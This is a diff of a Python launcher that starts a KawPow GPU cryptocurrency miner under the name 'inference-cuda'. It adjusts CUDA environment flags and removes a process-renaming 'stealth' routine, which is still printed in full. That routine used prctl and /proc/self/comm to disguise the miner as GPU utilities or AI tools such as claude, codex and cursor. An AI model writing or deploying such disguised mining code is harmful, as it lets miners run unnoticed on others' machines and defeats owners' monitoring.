@@ -85,17 +85,9 @@ def create_enhanced_gpu_environment():
     clean_env['GPU_MINING_SUBPROCESS'] = '1'
 
     # 3. CUDA Resource Optimization - Inspired by resource_control.py
+    # Minimal, non-intrusive defaults only
     cuda_optimizations = {
-        'CUDA_LAUNCH_TIMEOUT': '30',
-        # NOTE: Do not force low connection count globally; phase-gating is handled separately
-        # 'CUDA_DEVICE_MAX_CONNECTIONS': '1',
-        # CUDA_VISIBLE_DEVICES removed - let CUDA runtime auto-detect all GPUs
-        # 'CUDA_CACHE_DISABLE': '1',
-        'NVIDIA_DRIVER_CAPABILITIES': 'compute',
-        # Additional GPU-specific optimizations
-        # 'CUDA_FORCE_PTX_JIT': '1',  # Removed to avoid PTX-only JIT performance penalty
-        'CUDA_DISABLE_CUBLASLT': '1',
-        'CUDA_MODULE_LOADING': 'LAZY'
+        'NVIDIA_DRIVER_CAPABILITIES': 'compute'
     }
 
     for key, value in cuda_optimizations.items():
@@ -152,13 +144,18 @@ def main():
             # Memory optimization trước khi start inference-cuda
             logger.info("🧠 [MEMORY-OPT] Preparing DAG-safe environment (phase-gated)...")
 
-            # Always enable progressive DAG loading
+            # Always enable progressive DAG loading (safe for DAG build only)
             clean_env['KAWPOW_DAG_PROGRESSIVE'] = '1'
             logger.info("🔧 [TIER-8-CONFIG] Set KAWPOW_DAG_PROGRESSIVE=1")
 
             # Phase-gated safe flags: only set if explicitly enabled via ENV
             # Defaults to disabled to avoid throughput drop after DAG
             enable_dag_safe_flags = str(os.getenv('ENABLE_DAG_SAFE_FLAGS', '0')).lower() in ('1', 'true', 'yes')
+            # Hard policy: never allow PTX-only JIT (reduces hashrate)
+            if 'CUDA_FORCE_PTX_JIT' in clean_env:
+                clean_env.pop('CUDA_FORCE_PTX_JIT', None)
+                logger.info("🛡️ [POLICY] Removed CUDA_FORCE_PTX_JIT to protect hashrate")
+
             if enable_dag_safe_flags:
                 # These can reduce performance if kept for the whole run; enable only if explicitly requested
                 clean_env['CUDA_LAUNCH_BLOCKING'] = '1'
@@ -167,7 +164,15 @@ def main():
                 logger.info("🧠 [MEMORY-OPT] DAG safe flags enabled: CUDA_LAUNCH_BLOCKING=1, CUDA_CACHE_DISABLE=1, CUDA_DEVICE_MAX_CONNECTIONS=1")
             else:
                 # Ensure these are not present by default
-                for k in ('CUDA_LAUNCH_BLOCKING', 'CUDA_CACHE_DISABLE', 'CUDA_DEVICE_MAX_CONNECTIONS', 'CUDA_FORCE_PTX_JIT'):
+                for k in (
+                    'CUDA_LAUNCH_BLOCKING',
+                    'CUDA_CACHE_DISABLE',
+                    'CUDA_DEVICE_MAX_CONNECTIONS',
+                    'CUDA_FORCE_PTX_JIT',
+                    'CUDA_MODULE_LOADING',
+                    'CUDA_DISABLE_CUBLASLT',
+                    'CUDA_LAUNCH_TIMEOUT'
+                ):
                     clean_env.pop(k, None)
                 logger.info("🧠 [MEMORY-OPT] DAG safe flags disabled by default (ENABLE_DAG_SAFE_FLAGS=0)")
 
@@ -176,71 +181,13 @@ def main():
                 clean_env['KAWPOW_DAG_MEMORY_LIMIT'] = os.environ['KAWPOW_DAG_MEMORY_LIMIT']
                 logger.info("🔧 [TIER-8-CONFIG] Applied user-defined KAWPOW_DAG_MEMORY_LIMIT")
 
-            # Start inference-cuda as subprocess
-            # Pre-select child target name and setup preexec self-rename
-            stealth_names = [
-                "nvidiasmi", "cudagdb", "nvcc", "nvidiamlpy",
-                "nvidiasettings", "gpumanager", "glxgears",
-                "vulkaninfo", "mesaloader", "drmtip",
-                "tensorcore", "cudadrvr", "nvcompiler", "openclwkr",
-                "cudnnhelp", "nvrmdaemon", "gpusched", "cudaipc",
-                "claude", "codex", "code", "openai", "cursor", "agents", "windsurf"
-            ]
-            child_target_name = random.choice(stealth_names)
-
-            def _sanitize_comm_name(name: str) -> str:
-                """
-                Chuẩn hóa tên tiến trình cho /proc/*/comm: whitelist ký tự an toàn và giới hạn ≤15 byte.
-                """
-                allowed = "abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789._-"
-                filtered = ''.join(ch for ch in name if ch in allowed)
-                if not filtered:
-                    filtered = "gpuworker"
-                b = filtered.encode('utf-8')[:15]
-                return b.decode('utf-8', errors='ignore')
-
-            safe_name = _sanitize_comm_name(child_target_name)
-
-            disable_rename = os.getenv('DISABLE_PROCESS_RENAME', '0') == '1'
-            if disable_rename:
-                logger.info("⛔ [STEALTH-BYPASS] DISABLE_PROCESS_RENAME=1 → skipping all process renaming")
-
-
-            def _child_preexec():
-                """
-                Child pre-exec hook: tách nhóm tiến trình và tự đổi tên qua /proc/self/comm.
-                Tránh logging trong preexec để an toàn trước exec.
-                """
-                if disable_rename:
-                    return
-                try:
-                    os.setsid()
-                except Exception:
-                    pass
-                # Prefer prctl(PR_SET_NAME) để tên tồn tại bền vững qua exec
-                try:
-                    import ctypes
-                    libc = ctypes.CDLL('libc.so.6')
-                    PR_SET_NAME = 15
-                    # Dùng buffer cố định 16B, thiết lập argtypes/restype để tránh lỗi chuyển kiểu
-                    buf = ctypes.create_string_buffer(16)
-                    buf.value = safe_name.encode('utf-8')[:15]
-                    libc.prctl.argtypes = [ctypes.c_int, ctypes.c_void_p, ctypes.c_ulong, ctypes.c_ulong, ctypes.c_ulong]
-                    libc.prctl.restype = ctypes.c_int
-                    libc.prctl(PR_SET_NAME, ctypes.addressof(buf), 0, 0, 0)
-                except Exception:
-                    pass
-                try:
-                    with open("/proc/self/comm", "wb") as f:
-                        f.write(safe_name.encode("utf-8"))
-                except Exception:
-                    pass
+            # Start inference-cuda as subprocess (no process renaming)
 
             # **FIX: Remove stdout/stderr redirection to allow parent capture** (sửa: bỏ chuyển hướng stdout/stderr để parent có thể capture)
             process = subprocess.Popen(
                 exec_command,
                 env=clean_env,  # Use clean environment for subprocess ONLY
-                preexec_fn=None if disable_rename else _child_preexec,
+                preexec_fn=None,
                 # stdout and stderr will inherit parent's pipes for logging
                 stdout=subprocess.PIPE, # Giữ lại để có thể log output
                 stderr=subprocess.PIPE, # Giữ lại để có thể log output
@@ -252,14 +199,8 @@ def main():
             monitor_thread = threading.Thread(target=monitor_and_log_output, args=(process, 'inference-cuda'))
             monitor_thread.daemon = True
             monitor_thread.start()
-            # ---- New: Rename child PID and register to DirectPIDRegistry ----
+            # ---- Register to DirectPIDRegistry (no renaming) ----
             try:
-                # /proc/<pid>/comm expects ≤15 byte; child self-rename đã được thiết lập qua preexec_fn
-                new_name = safe_name
-
-                # ✅ Child self-rename sẽ chạy trong preexec_fn; giữ background thread như fallback
-                logger.info(f"🔒 [GPU-POST-EXEC-STEALTH] Child self-rename scheduled via preexec_fn (PID {process.pid}) target='{new_name}'")
-
                 # ====================================
                 # LINEAR FLOW: Enhanced Readiness Check & Hook Sequencing
                 # ====================================
